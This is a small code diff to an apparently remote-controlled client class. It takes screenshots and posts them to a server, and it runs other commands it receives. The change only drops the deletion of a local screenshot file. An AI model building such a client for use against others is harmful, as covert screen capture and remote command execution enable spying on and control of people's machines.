@@ -120,8 +120,6 @@ class AmosClient:
             elif command == "screenshot":
                 img_bytes = self.general_features.screenshot()
                 self.server_handler.post_to_server(image_data=img_bytes)
-                if os.path.isfile("screenshot.png"):
-                    os.remove("screenshot.png")
 
             else:
                 self.server_handler.run_command(command)
